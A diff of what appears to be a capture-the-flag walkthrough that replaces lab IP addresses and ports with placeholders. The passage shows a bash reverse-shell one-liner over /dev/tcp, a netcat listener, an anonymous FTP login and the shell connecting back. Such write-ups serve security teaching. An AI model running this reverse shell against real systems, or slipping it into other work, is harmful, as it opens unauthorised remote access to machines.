@@ -308,21 +308,21 @@ fi
 
 <pre><code>
 #!/bin/bash
-bash -i >& /dev/tcp/10.10.29.125/4444 0>&1
+bash -i >& /dev/tcp/[Attack_Box]/[Chosen_Port] 0>&1
 </code></pre>
 
 <br>
 
-<pre><code>root@[Attack_Box]:~/anonymous# nc -nvlp 4444
-Listening on [0.0.0.0] (family 0, port 4444)
+<pre><code>root@[Attack_Box]:~/anonymous# nc -nvlp [Chosen_Port]
+Listening on [0.0.0.0] (family 0, port [Chosen_Port])
 </code></pre>
 
 <br>
 
-<pre><code>oot@ip-[Attack_Box]:~/anonymous# ftp 10.10.150.106
+<pre><code>oot@ip-[Attack_Box]:~/anonymous# ftp [Target]
 Connected to [Target].
 220 NamelessOne's FTP Server!
-Name (10.10.150.106:root): anonymous
+Name ([Target]:root): anonymous
 331 Please specify the password.
 Password:
 230 Login successful.
@@ -346,7 +346,7 @@ ftp>
 
 <br>
 
-<pre><code>oot@ip-[Attack_Box]:~/anonymous# nc -nvlp 4444
+<pre><code>oot@ip-[Attack_Box]:~/anonymous# nc -nvlp [Chosen_Port]
 Listening on [0.0.0.0] (family 0, port 4444)
 Connection from [Target] 34812 received!
 bash: cannot set terminal process group (1522): Inappropriate ioctl for device
